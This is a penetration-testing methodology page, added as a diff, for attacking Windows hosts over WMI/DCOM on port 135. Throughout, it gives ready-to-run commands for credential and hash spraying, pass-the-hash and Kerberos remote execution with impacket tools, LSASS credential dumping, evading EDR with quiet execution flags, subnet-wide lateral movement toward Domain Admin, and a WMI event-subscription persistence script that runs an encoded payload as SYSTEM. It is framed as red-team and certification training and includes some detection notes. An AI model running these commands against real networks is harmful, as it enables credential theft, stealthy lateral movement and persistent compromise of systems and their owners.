@@ -1,0 +1,421 @@
+---
+title: WMI / DCOM / RPC - Port 135
+description: Post-credential enumeration, command execution, and lateral movement methodology for WMI/DCOM over the RPC endpoint mapper on port 135.
+openGraph:
+  title: "WMI / DCOM / RPC - Port 135"
+  description: "Post-credential enumeration, command execution, and lateral movement methodology for WMI/DCOM over the RPC endpoint mapper on port 135."
+  images:
+    - url: /imgs/WMI.jpg
+      width: 1672
+      height: 941
+      alt: WMI / DCOM / RPC - Port 135
+      type: image/jpeg
+twitter:
+  card: summary_large_image
+  title: "WMI / DCOM / RPC - Port 135"
+  description: "Post-credential enumeration, command execution, and lateral movement methodology for WMI/DCOM over the RPC endpoint mapper on port 135."
+  images:
+    - url: /imgs/WMI.jpg
+      width: 1672
+      height: 941
+      alt: WMI / DCOM / RPC - Port 135
+      type: image/jpeg
+---
+
+# WMI / DCOM / RPC - Port 135
+
+import { Callout } from 'nextra/components'
+
+## Cheatsheet
+
+```bash
+nmap -sV -sC -p135 <IP>
+nmap -sV --script msrpc-enum -p135 <IP>
+
+# rpcdump 
+impacket-rpcdump <IP>
+impacket-rpcdump <USER>:<PASS>@<IP> -p 135          # authenticated 
+nxc wmi <IP> -u <USER> -p <PASS> -d <DOMAIN>
+nxc wmi <IP> -u <USER> -H <HASH>                # pass-the-hash
+nxc wmi <IP> -u users.txt -p passwords.txt      # multi-cred spray
+nxc wmi <IP> -u <USER> --kerberos               # KRB5CCNAME ticket
+nxc wmi <IP> -u <USER> -p <PASS> -x "whoami /all"
+
+# NetExec read-only WMI queries (no execution, pure info)
+nxc wmi <IP> -u <USER> -p <PASS> --wmi "SELECT * FROM Win32_ComputerSystem"
+nxc wmi <IP> -u <USER> -p <PASS> --wmi-namespace root\\cimv2
+
+# NetExec dump LSASS over WMI without touching disk
+nxc wmi <IP> -u <USER> -p <PASS> -M lsassy
+
+# Impacket wmiexec semi-interactive shell (Win32_Process.Create)
+impacket-wmiexec <USER>:<PASS>@<IP>
+impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<IP>
+impacket-wmiexec -hashes :<HASH> <USER>@<IP>                 # pass-the-hash
+impacket-wmiexec -k -no-pass <USER>@<FQDN>                   # Kerberos (KRB5CCNAME)
+impacket-wmiexec -no-output <USER>:<PASS>@<IP> "<CMD>"       # blind, no ADMIN$ write
+impacket-wmiexec -silentcommand <USER>:<PASS>@<IP> "<CMD>"   # no cmd.exe /Q /c wrapper
+
+# Impacket dcomexec (MMC20 / ShellWindows / ShellBrowserWindow DCOM objects)
+impacket-dcomexec -object MMC20 <USER>:<PASS>@<IP>
+impacket-dcomexec -object ShellWindows -hashes :<HASH> <USER>@<IP>
+impacket-dcomexec -object ShellBrowserWindow <USER>:<PASS>@<IP>
+
+# Impacket atexec fallback when DCOM dynamic ports are filtered (fixed TCP 445)
+impacket-atexec <USER>:<PASS>@<IP> "whoami"
+impacket-atexec -hashes :<HASH> <USER>@<IP> "whoami"
+```
+
+```powershell
+# PowerShell modern CIM/WMI over DCOM (run from a Windows host or pwsh)
+$cred = Get-Credential
+$opt  = New-CimSessionOption -Protocol Dcom        # DCOM over 135; -Protocol Wsman = WinRM
+$cs   = New-CimSession -ComputerName <IP> -Credential $cred -SessionOption $opt
+
+# Enumeration queries (read-only)
+Get-CimInstance -CimSession $cs -ClassName Win32_OperatingSystem
+Get-CimInstance -CimSession $cs -ClassName Win32_Process
+Get-CimInstance -CimSession $cs -ClassName Win32_LoggedOnUser
+
+# Remote process creation native equivalent of wmiexec
+Invoke-CimMethod -CimSession $cs -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='cmd.exe /c whoami > C:\Windows\Temp\o.txt'}
+```
+
+```cmd
+:: WMIC from Windows (deprecated, removed on current builds; present on <= Win10 21H1 / Server 2019)
+wmic /node:<IP> /user:<USER> /password:<PASS> os get caption,version,osarchitecture
+wmic /node:<IP> /user:<USER> /password:<PASS> process call create "cmd.exe /c whoami > C:\Windows\Temp\o.txt"
+```
+
+## Methodology
+
+### Phase 1: Confirm RPC / WMI Exposure
+
+<Callout type="default" emoji="?">
+  **Questions to ask**
+
+  - Is this actually a Windows host, or a Samba server that registers RPC interfaces but cannot run wmiexec/dcomexec?
+  - Which RPC interfaces are registered, and do any (PrintSystem, Task Scheduler, EFSRPC) suggest a separate attack path?
+  - Did my scan cover the dynamic high-port range that DCOM negotiates after the initial EPM call?
+  - Is a firewall allowing 135 but silently dropping the dynamic ports WMI execution actually uses?
+</Callout>
+
+```bash
+# Confirm the RPC endpoint mapper banner
+nmap -sV -sC -p135 <IP>
+
+# Unauthenticated dump of every RPC interface bound to the endpoint mapper
+impacket-rpcdump <IP>
+
+# Authenticated rpcdump reveals more interfaces
+impacket-rpcdump <USER>:<PASS>@<IP>
+```
+
+- [ ] `nmap -sV -sC -p135 <IP>` confirm the endpoint mapper. Nmap reports `Microsoft Windows RPC` on modern hosts; anything else means it is not a Windows DCOM target.
+- [ ] `impacket-rpcdump <IP>` pre-auth dump of every interface bound to DCOM (SCM, DNS, Task Scheduler, Print Spooler, WMI, Eventlog, LSARPC) with UUIDs and dynamic ports. A `PrintSystem` interface is a PrintNightmare candidate; `efsrpc` hints at PetitPotam coercion.
+- [ ] Confirm the host is Windows, not Samba. `rpcdump` works against Samba too, but wmiexec/dcomexec do not — do not waste time there.
+- [ ] Verify your earlier scan covered high ports (49152–65535 on Vista+; 1024+ on XP/2003). Seeing only 135 open does not mean WMI execution is blocked the dynamic port may be reachable.
+
+### Phase 2: Credential Validation
+
+<Callout type="default" emoji="?">
+  **Questions to ask**
+
+  - Which credentials and hashes have I already harvested from SMB, LDAP, FTP, web configs, or LSASS that I have not yet tried here?
+  - Does this credential authenticate, and does it actually have rights to invoke WMI methods?
+  - Should I scope to the domain (`-d`) or the local SAM, and which one matches where the account lives?
+  - Will an FQDN + Kerberos look quieter than an IP + NTLM for this validation?
+</Callout>
+
+```bash
+# Validate a single credential over DCOM/WMI
+nxc wmi <IP> -u <USER> -p <PASS>
+
+# Domain-scoped, pass-the-hash, and Kerberos variants
+nxc wmi <IP> -u <USER> -p <PASS> -d <DOMAIN>
+nxc wmi <IP> -u <USER> -H <HASH>
+nxc wmi <FQDN> -u <USER> --kerberos
+```
+
+- [ ] `nxc wmi <IP> -u <USER> -p <PASS>` validate over WMI. NetExec sends a WMI-layer auth rather than a raw NTLM bind, so a `[+]` means the credential can actually reach the WMI layer.
+- [ ] `nxc wmi <IP> -u <USER> -p <PASS> -d <DOMAIN>` WMI authorization is evaluated against the full domain-qualified SID; stripping the domain can trigger a local SAM lookup that silently misauthorizes.
+- [ ] `nxc wmi <IP> -u <USER> -H <HASH>` WMI natively supports NTLM over DCOM, so pass-the-hash works with no target-side change, which needs Restricted Admin Mode).
+- [ ] `nxc wmi <FQDN> -u <USER> --kerberos` with `KRB5CCNAME` set targeting an FQDN forces Kerberos instead of NTLM and looks like normal admin tooling.
+- [ ] If you get `[+]` but `-x "whoami"` fails, the user authenticated but is likely not a local admin — proceed to Phase 3 before assuming the credential is useless.
+
+### Phase 3: Resolve the Authorization Model
+
+<Callout type="default" emoji="?">
+  **Questions to ask**
+
+  - Is this credential a local administrator, or only a member of Distributed COM Users?
+  - Can I read a WMI namespace but not invoke `Win32_Process.Create`?
+  - Does BloodHound show an `ExecuteDCOM` edge that explains partial access?
+  - Is a hang on `-x` an authorization failure (silent DCOM drop) rather than a network problem?
+</Callout>
+
+```bash
+# Read-only WQL test succeeds with namespace read even without execute rights
+nxc wmi <IP> -u <USER> -p <PASS> --wmi "SELECT * FROM Win32_OperatingSystem"
+
+# Compare against an execution attempt hang here points at missing execute rights
+nxc wmi <IP> -u <USER> -p <PASS> -x "whoami"
+```
+
+- [ ] Run the read-only WQL query first. If it succeeds but `-x` hangs, you have namespace read but not `Win32_Process.Create` execute rights — the DCOM security check drops the method call silently rather than returning a clean access-denied.
+- [ ] If even the WQL query fails, you lack namespace enumerate rights the credential is not useful over WMI; spray it elsewhere.
+- [ ] Remember the three independent ACLs (DCOM Launch/Activation, DCOM Access, WMI Namespace `Execute Methods + Remote Enable`) must all grant — local admin grants all three by default, so a hang almost always means "not local admin".
+- [ ] Check BloodHound for the `ExecuteDCOM` edge on this user it is one of the highest-value lateral edges after `AdminTo` and `CanPSRemote` and explains non-admin execution.
+
+### Phase 4: Command Execution
+
+<Callout type="default" emoji="?">
+  **Questions to ask**
+
+  - Do I need interactive output, or is a fire-and-forget payload drop enough?
+  - Which wmiexec artifacts (the `cmd.exe /Q /c` tree, the `ADMIN$\__<ts>` output file) will the target EDR fingerprint, and can I strip them with `-silentcommand` / `-no-output`?
+  - Is `Win32_Process.Create` itself monitored here, making a different DCOM object (MMC20, ShellWindows) worthwhile?
+  - Is the dynamic high port reachable, or do I need an `atexec` (445) fallback because a firewall is dropping it?
+</Callout>
+
+```bash
+# Primary: wmiexec semi-interactive shell (Win32_Process.Create)
+impacket-wmiexec <USER>:<PASS>@<IP>
+impacket-wmiexec -hashes :<HASH> <USER>@<IP>                 # pass-the-hash
+impacket-wmiexec -k -no-pass <USER>@<FQDN>                   # Kerberos (KRB5CCNAME)
+impacket-wmiexec -silentcommand -no-output <USER>:<PASS>@<IP> "<CMD>"   # quiet single-shot
+
+# Fallback A: dcomexec different DCOM object, different parent process
+impacket-dcomexec -object MMC20 <USER>:<PASS>@<IP>
+impacket-dcomexec -object ShellWindows -hashes :<HASH> <USER>@<IP>
+impacket-dcomexec -object ShellBrowserWindow <USER>:<PASS>@<IP>
+
+# Fallback B: atexec scheduled task over fixed TCP 445 when dynamic ports are filtered
+impacket-atexec <USER>:<PASS>@<IP> "whoami"
+```
+
+- [ ] `impacket-wmiexec <USER>:<PASS>@<IP>` default shell. Each command runs as `cmd.exe /Q /c <cmd> 1> \\127.0.0.1\ADMIN$\__<ts> 2>&1`; impacket reads the output over SMB and deletes it. Treat the `WmiPrvSE.exe → cmd.exe /Q /c` tree as a known EDR signature, not as stealth.
+- [ ] `impacket-wmiexec -hashes :<HASH> <USER>@<IP>` pass-the-hash; only the NT half is needed on modern Windows. `-k -no-pass` after `export KRB5CCNAME=ticket.ccache` switches to Kerberos.
+- [ ] `impacket-wmiexec -silentcommand -no-output <USER>:<PASS>@<IP> "<CMD>"` `-silentcommand` drops the `cmd.exe /Q /c` wrapper and `-no-output` drops the ADMIN$ write and SMB read-back; use this pairing whenever OPSEC matters and you do not need stdout.
+- [ ] If wmiexec hangs after a successful `nxc wmi` validation, suspect a firewall dropping the dynamic port (not bad creds) switch to a fallback.
+- [ ] Fallback A `impacket-dcomexec -object MMC20 <USER>:<PASS>@<IP>` abuses `MMC20.Application...ExecuteShellCommand` and spawns `mmc.exe → cmd.exe`; `ShellWindows`/`ShellBrowserWindow` chain through Explorer (`explorer.exe → cmd.exe`). Use these when `Win32_Process.Create` is monitored or MMC20 is disabled. PtH and Kerberos flags behave identically to wmiexec.
+- [ ] Fallback B `impacket-atexec <USER>:<PASS>@<IP> "<CMD>"` runs over fixed TCP 445 (scheduled task), so it survives a blocked dynamic-port range at the cost of scheduled-task events (4698/4702).
+
+
+### Phase 5: Post-Exploitation and Pillaging
+
+<Callout type="default" emoji="?">
+  **Questions to ask**
+
+  - What AV/EDR is running here *before* I drop any tooling?
+  - Who is logged on right now, and is a Domain Admin token sitting on this box?
+  - Can I pull the intel I need with read-only WQL instead of spawning processes?
+  - Is this user already local admin, meaning I can jump straight to LSASS and privesc?
+</Callout>
+
+```bash
+# Check the defensive posture before touching tooling
+nxc wmi <IP> -u <USER> -p <PASS> --wmi "SELECT * FROM AntiVirusProduct" --wmi-namespace "root\SecurityCenter2"
+
+# Read-only situational awareness queries
+nxc wmi <IP> -u <USER> -p <PASS> --wmi "SELECT * FROM Win32_LoggedOnUser"
+nxc wmi <IP> -u <USER> -p <PASS> --wmi "SELECT * FROM Win32_Service WHERE State='Running'"
+
+# Dump LSASS over WMI without writing a minidump to disk
+nxc wmi <IP> -u <USER> -p <PASS> -M lsassy
+```
+know whether you are facing Defender or CrowdStrike/SentinelOne before dropping a payload. This single read-only query changes the whole plan.
+- [ ] Run read-only WQL for logged-on users and running services `Win32_LoggedOnUser` reveals DA tokens to hunt; this is process-creation-free and extremely quiet.
+- [ ] Run situational-awareness commands through your shell (`whoami /all`, `ipconfig /all`, `systeminfo`, `net localgroup administrators`) to confirm identity and privileges.
+- [ ] `nxc wmi <IP> -u <USER> -p <PASS> -M lsassy` minidump LSASS via a remote process and stream it back over SMB; you get clear hashes without leaving a persistent dump on disk.
+
+### Phase 6: Lateral Movement
+
+<Callout type="default" emoji="?">
+  **Questions to ask**
+
+  - Which harvested hashes or credentials have I not yet sprayed across the subnet?
+  - Is a local Administrator hash reused across imaged hosts in this environment?
+  - Where WMI works but WinRM does not, does that confirm I have local admin?
+  - What is the shortest pivot chain from here to a Domain Admin?
+</Callout>
+
+```bash
+# Spray a working credential or hash across the subnet over WMI
+nxc wmi <SUBNET>/24 -u <USER> -p <PASS>
+nxc wmi <SUBNET>/24 -u Administrator -H <HASH>
+```
+
+- [ ] `nxc wmi <SUBNET>/24 -u <USER> -p <PASS>` WMI is on by default on every Windows host, so it gives the broadest spray surface of any protocol.
+- [ ] `nxc wmi <SUBNET>/24 -u Administrator -H <HASH>` local-admin hash reuse across imaged hosts is the single most common source of lateral movement in flat networks.
+- [ ] If WMI succeeds on a host but WinRM does not, you almost certainly have local admin WMI requires it, while WinRM also accepts Remote Management Users members.
+- [ ] Chain it: wmiexec → dump hashes → `nxc wmi <SUBNET>/24 -H` with the new hashes → wmiexec on the next tier → repeat until Domain Admin.
+
+<Quiz
+  question="You have a local administrator NTLM hash. WinRM (5985) is closed, WMI/DCOM (135 + dynamic) is reachable, and SMB (445) is open but an IPS blocks service installation via svcctl. The engagement is OPSEC-sensitive and you only need a single-shot beacon drop. Which do you pick?"
+  options={[
+    "impacket-psexec most reliable, handles edge cases",
+    "impacket-wmiexec with default settings no service install so it's stealthy enough",
+    "impacket-wmiexec -silentcommand -no-output different transport from SMB, with both noisy artifacts removed",
+    "impacket-smbexec reuse the already-open 445"
+  ]}
+  answer={2}
+  explanation="psexec and smbexec both install a service via svcctl, which the IPS is blocking — dead on arrival. Default wmiexec works but leaves the `cmd.exe /Q /c` process tree and the `ADMIN$\\__<ts>` output file, both signature-matched by mature EDR. `-silentcommand` removes the wrapper and `-no-output` removes the ADMIN$ write, so the only remaining artifact is the WMI method call on a completely different transport (135 + dynamic) than the scrutinized SMB path. The key lesson: WMI's value is not absolute stealth, it is being a different transport layer that survives when SMB execution is blocked."
+/>
+
+## Overview
+
+WMI (Windows Management Instrumentation) is Microsoft's implementation of WBEM and CIM. It is a local and remote management framework exposed as **providers** (DLLs that publish system data) grouped into **namespaces** (`root\cimv2` for general OS data, `root\SecurityCenter2` for AV state, `root\directory\LDAP` for AD data on DCs). To an attacker it is three things at once: an execution primitive (`Win32_Process.Create`), an enumeration surface (queryable via WQL), and a persistence mechanism (event subscriptions).
+
+The transport is **DCOM over MS-RPC**. A WMI call contacts the RPC Endpoint Mapper on port 135, which returns the dynamic high port currently bound by the WMI service (`Winmgmt`). All subsequent traffic flows over that high port, authenticated and encrypted via NTLM or Kerberos SSPI at the DCOM layer.
+
+| Detail | Value |
+|--------|-------|
+| Port 135/TCP | RPC Endpoint Mapper (EPM) initial contact for DCOM services |
+| Port 49152–65535/TCP | Dynamic ports used by WMI and other DCOM services (Vista+) |
+| Port 1024+/TCP | Legacy dynamic ports on XP/2003 |
+| Protocol stack | DCOM (MS-DCOM) over MS-RPC (MS-RPCE) over TCP |
+| Authentication | NTLM or Kerberos via SSPI (Negotiate) |
+| Access requirement | Local Administrators **or** Distributed COM Users with WMI namespace `Execute Methods + Remote Enable` |
+| Service name | `Winmgmt` + `RpcSs` (DCOM Server Process Launcher) |
+| Provider host | `WmiPrvSE.exe` one process per namespace, child of `svchost.exe` |
+| Query language | WQL a SQL-like subset |
+
+### WMI Namespaces Worth Knowing
+
+| Namespace | Contents |
+|-----------|----------|
+| `root\cimv2` | Default. `Win32_*` classes processes, services, OS, hardware, network |
+| `root\SecurityCenter2` | `AntiVirusProduct`, `AntiSpywareProduct`, `FirewallProduct` (Vista+) |
+| `root\subscription` | `__EventFilter`, `__EventConsumer`, `__FilterToConsumerBinding` persistence |
+| `root\directory\LDAP` | DS-WMI classes on domain controllers AD object access via WMI |
+| `root\Microsoft\Windows\Defender` | Windows Defender state (definitions, threats, exclusions) |
+| `root\rsop\computer` | Resultant Set of Policy effective GPO settings for the host |
+
+### DCOM, RPC, and the Endpoint Mapper
+
+| Layer | Role |
+|-------|------|
+| Endpoint Mapper (EPM) | TCP 135 returns the dynamic port for a given interface UUID |
+| MSRPC | Low-level RPC transport, authenticated via SSPI |
+| DCOM | Object activation layer maps class IDs to RPC interfaces |
+| WMI | DCOM application exposing namespaces and methods |
+| Win32_Process.Create | The standard execution primitive creates a process on the target |
+
+<Callout type="info">
+**RPC's dynamic-port dance is where WMI gets blocked at the network layer.** A firewall that allows 135 but drops 49152–65535 kills WMI execution silently — the EPM call succeeds, the target returns "use port 51734", and your wmiexec follow-up hangs. When wmiexec fails on a host where `nxc wmi` reports valid creds, suspect a stateful firewall dropping the dynamic port. Workarounds: `impacket-atexec` (fixed TCP 445), pivot through a host inside the segment, or pin the RPC port range via `HKLM\SOFTWARE\Microsoft\Rpc\Internet`.
+</Callout>
+
+## Quick Reference
+
+```bash
+nmap -sV -sC -p135 <IP>                # Scan for open RPC Endpoint Mapper on 135/tcp
+impacket-rpcdump <IP>                  # Enumerate available RPC interfaces on the host
+nxc wmi <IP> -u <USER> -p <PASS>       # Validate credentials (local admin or DCOM user)
+nxc wmi <IP> -u <USER> -H <HASH>       # Pass-the-hash for authentication
+nxc wmi <IP> -u <USER> -p <PASS> --wmi "<WQL>"    # Run a WMI query (e.g., OS, processes)
+nxc wmi <IP> -u <USER> -p <PASS> -x "<CMD>"       # Execute command via WMI remotely
+impacket-wmiexec <USER>:<PASS>@<IP>    # Open an interactive shell via WMI
+impacket-wmiexec -silentcommand -no-output <USER>:<PASS>@<IP>   # Stealth shell, minimal artifacts
+impacket-dcomexec -object MMC20 <USER>:<PASS>@<IP>     # DCOM alternative command execution
+impacket-wmiexec -k -no-pass <USER>@<FQDN>        # Kerberos auth (no password) using a TGT cache
+nxc wmi <IP> -u <USER> -p <PASS> -M lsassy        # Dump LSASS process memory with lsassy module
+nxc wmi <SUBNET>/24 -u <USER> -p <PASS>           # Sweep subnet for accessible hosts via WMI
+nxc wmi <SUBNET>/24 -u Administrator -H <HASH>    # Hash spray attack across subnet with admin hash
+nxc wmi <IP> -u <USER> -p <PASS> --wmi "SELECT * FROM AntiVirusProduct" --wmi-namespace "root\SecurityCenter2"    # Enumerate AV/EDR products via WMI SecurityCenter2
+```
+
+## Execution Primitives Compared
+
+Every Impacket execution tool achieves the same end goal a command running on the target but they differ in transport, privilege requirement, detection surface, and output retrieval. Choosing the right one is an OPSEC decision, not a convenience one.
+
+| Tool | Primitive | Transport | Service Install | Process Tree | Output Path |
+|------|-----------|-----------|-----------------|--------------|-------------|
+| `impacket-psexec` | SMB + SVCCTL service | 445 | Yes (Event 7045) | `services.exe → <random>.exe` | Named pipe |
+| `impacket-smbexec` | SMB + SVCCTL service | 445 | Yes (Event 7045) | `services.exe → cmd.exe` | Temp file on `C$` |
+| `impacket-wmiexec` | WMI Win32_Process.Create | 135 + dynamic | No | `WmiPrvSE.exe → cmd.exe /Q /c` | `\\127.0.0.1\ADMIN$\__<ts>` |
+| `impacket-dcomexec` | DCOM object abuse | 135 + dynamic | No | `mmc.exe → cmd.exe` or `explorer.exe → cmd.exe` | `\\127.0.0.1\ADMIN$\__<ts>` |
+| `impacket-atexec` | Scheduled task (ATSVC) | 445 | No (but creates task) | `taskeng.exe → cmd.exe` | Temp file on `C$` |
+| `evil-winrm` | WSMan / PSRemoting | 5985/5986 | No | `wsmprovhost.exe` | Runspace stream |
+
+**Stealth ranking (lowest detection first):**
+1. `evil-winrm` with `Bypass-4MSI` + `Invoke-Binary` native admin tooling, no process-tree anomaly
+2. `impacket-wmiexec -silentcommand -no-output` bypasses the two distinctive wmiexec signatures
+3. `impacket-dcomexec -object ShellWindows` less signature coverage, unusual parent process
+4. `impacket-atexec`no service install, but scheduled-task events (4698/4702) are logged
+5. `impacket-wmiexec` (default) noisy process tree and ADMIN$ writes, no service install
+6. `impacket-smbexec` service install
+7. `impacket-psexec` service install and RemComSvc.exe binary drop
+
+## wmiexec Internals What Happens on the Wire
+
+Understanding the flow is the difference between treating wmiexec as a black box and being able to debug it when it fails. Each command triggers:
+
+1. **EPM lookup on 135.** Impacket queries the endpoint mapper for the `IWbemLevel1Login` interface UUID and receives the dynamic port.
+2. **DCOM activation.** Impacket binds to the dynamic port, authenticates via NTLMSSP or Kerberos SSPI, and activates an `IWbemLevel1Login` object.
+3. **Namespace connect.** `NTLMLogin` connects to `root\cimv2`, returning an `IWbemServices` pointer.
+4. **Method invocation.** `IWbemServices::ExecMethod` calls `Win32_Process::Create` with the command line; the target `WmiPrvSE.exe` invokes `CreateProcessAsUser` and returns the PID.
+5. **SMB read-back.** Impacket opens an SMB session to `\\<TARGET>\ADMIN$`, reads the `__<timestamp>` output file, and deletes it.
+6. **Repeat for the next command.**
+
+Key OPSEC observations: every command is a fresh DCOM activation (multiple `4624 Type 3` events per command, not one per shell); `Win32_Process.Create` is recorded by `Microsoft-Windows-WMI-Activity/Operational` when enabled (default on Server 2012+); the SMB read-back is a separate authentication that `-no-output` eliminates; and the `cmd.exe /Q /c` wrapper is impacket-added (for output capture), removed by `-silentcommand`.
+
+## PowerShell Native WMI / CIM
+
+PowerShell provides two generations of cmdlets. **CIM cmdlets** (`Get-CimInstance`, `Invoke-CimMethod`, `New-CimSession`) are the modern, supported path and work with PowerShell 7. **WMI cmdlets** (`Get-WmiObject`, `Invoke-WmiMethod`) are legacy, Windows-PowerShell-5.1 only, and removed in PowerShell 7.
+
+```powershell
+# Build a credential + DCOM session (default protocol is WSMan; DCOM = port 135)
+$cred = Get-Credential
+$opt  = New-CimSessionOption -Protocol Dcom
+$cs   = New-CimSession -ComputerName <IP> -Credential $cred -SessionOption $opt
+
+# Pure enumeration (no execution silent WQL)
+Get-CimInstance -CimSession $cs -Query "SELECT * FROM Win32_Process WHERE Name='lsass.exe'"
+Get-CimInstance -CimSession $cs -Namespace root\SecurityCenter2 -ClassName AntiVirusProduct
+Get-CimInstance -CimSession $cs -ClassName Win32_LoggedOnUser
+
+# Remote process creation native equivalent of wmiexec
+Invoke-CimMethod -CimSession $cs -ClassName Win32_Process -MethodName Create -Arguments @{
+    CommandLine = 'powershell -enc <BASE64_PAYLOAD>'
+}
+
+# Tear down the session explicitly
+Remove-CimSession $cs
+```
+
+<Callout type="info">
+**Native PS WMI is the quietest path from an already-compromised host.** When pivoting from a host that already runs legitimate PowerShell admin tooling, `New-CimSession -Protocol Dcom` + `Invoke-CimMethod` blends into baseline activity far better than impacket from an external box. `runas /netonly` + `pwsh` + `Invoke-CimMethod` is the classic lateral-movement pattern that chains Kerberos tickets across hops cleanly.
+</Callout>
+
+## WMI for Persistence Event Subscriptions
+
+WMI event subscriptions register a filter (a WQL query that fires on a condition) bound to a consumer (a command to run). The binding persists across reboots, runs as `NT AUTHORITY\SYSTEM`, and leaves no scheduled task or service artifact.
+
+```powershell
+# Create a permanent WMI event subscription (persistence)
+$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
+    Name           = 'PensieveFilter'
+    EventNamespace = 'root\cimv2'
+    QueryLanguage  = 'WQL'
+    Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+}
+
+$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
+    Name                = 'PensieveConsumer'
+    CommandLineTemplate = 'powershell -enc <BASE64_PAYLOAD>'
+}
+
+Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
+    Filter   = $filter
+    Consumer = $consumer
+}
+```
+
+<Callout type="warning">
+**WMI event-subscription persistence is loud to modern detections.** Sysmon events 19 (WmiEventFilter), 20 (WmiEventConsumer), and 21 (WmiEventConsumerToFilter) were added specifically to catch this. Any environment with a reasonable Sysmon config (SwiftOnSecurity, Olaf Hartong, Florian Roth) alerts with high fidelity. Treat WMI persistence as a lab technique; for stealth persistence on a mature engagement, look elsewhere (COM hijacking, scheduled tasks with modified triggers).
+</Callout>
+
+<div className="flex flex-wrap gap-2 mb-4">
+  #PenetrationTesting #RedTeam #Certification #Windows #WMI #ServiceEnum #WMExec #DCOM #RemoteExecution #EDRBypass #Sysmon #Pivoting #CredentialAccess #PostExploitation #WinRM
+</div>
